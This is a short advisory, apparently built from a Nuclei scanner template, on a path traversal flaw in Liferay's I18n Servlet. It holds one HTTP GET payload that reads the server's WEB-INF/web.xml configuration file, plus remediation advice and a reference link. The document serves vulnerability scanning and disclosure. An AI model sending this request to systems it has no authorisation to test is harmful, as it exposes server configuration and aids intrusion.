# Nuclei Template: Liferay - Local File Inclusion
**Template ID:** liferay-resource-leak
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`liferay-resource-leak.yaml`)

## Vulnerability Information & PoC

## Description
Liferay is vulnerable to local file inclusion in the I18n Servlet because it leaks information via sending an HTTP request to /[language]/[resource];.js (also .jsp works).

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/en/WEB-INF/web.xml;.js
```

## Remediation
Update Liferay to the latest version

## References
- https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java
